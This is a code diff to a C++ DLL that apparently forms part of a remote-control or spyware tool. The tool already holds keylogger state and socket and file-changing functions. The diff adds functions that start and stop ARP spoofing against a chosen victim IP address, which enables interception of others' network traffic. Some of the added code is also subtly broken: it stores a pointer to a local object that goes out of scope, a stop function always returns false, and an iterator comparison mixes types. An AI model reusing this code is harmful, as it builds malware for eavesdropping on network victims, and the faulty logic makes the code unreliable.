@@ -1,8 +1,11 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include "Components.h"
+#include "arpspoof.h"
 
 #define EXPORTING_DLL
+
 vector<SOCKET*> sockets;
+vector<Arpspoof*> spoofvictims;
 string kl;
 bool storeKeys;
 
@@ -84,7 +87,46 @@ string OpenSocket(std::string ip_and_port)
 		t1.detach();
 	}
 }
+/*
+	start thread to spoof victim
+*/
+string SpoofVictim(std::string ip)
+{
+		thread t(&SpoofVictimInThread, ip);
+		t.detach();
+		return "Spoof started";
+}
 
+/*
+	start spoofing a victim ip. 
+	create a spoofing object and add it to the spoofvictims vector
+	start spoofing in new thread
+*/
+void SpoofVictimInThread(std::string ip)
+{
+	Arpspoof a(ip);
+	spoofvictims.push_back(&a);
+	a.SendArpReplayForSpoofing(ip);
+}
+
+/*
+stop spoofing a victim ip.
+find a spoofing object in the spoofvictims vector
+change the boolean in the object to stop the spoof
+*/
+bool StopSpoofingVictim(std::string ip)
+{
+	vector<Arpspoof*>::iterator it = std::find_if(spoofvictims.begin(), spoofvictims.end(), [&ip](Arpspoof *obj) {return obj->_ip == ip; });
+	if (it != spoofvictims.end())
+	{
+		(*it)->stop = true;
+	}
+	return false;
+}
+
+/*
+change file
+*/
 string ChangeFile(string cmd)
 {
 	vector<string> res = split(cmd);
@@ -111,8 +153,7 @@ string ChangeFile(string cmd)
 }
 
 /*
-	
-	returns arp table. each ip and mac
+	returns arp table. interface, each ip and mac
 */
 string GetArpTable()
 {
@@ -238,6 +279,7 @@ string OpenSocketWithThread(std::string ip_and_port)
 		if (success)
 		{
 			MessageBox(NULL, "success", "success", 0);
+			sockets.push_back(s);
 		}
 		while (success)
 		{
@@ -247,7 +289,7 @@ string OpenSocketWithThread(std::string ip_and_port)
 	}
 	catch (...)
 	{
-		vector<SOCKET>::iterator it;
+		vector<SOCKET*>::iterator it = sockets.begin();
 		SOCKET sf = std::find(sockets.begin(), sockets.end(), s) != sockets.end();
 		if (it != sockets.end())
 		{
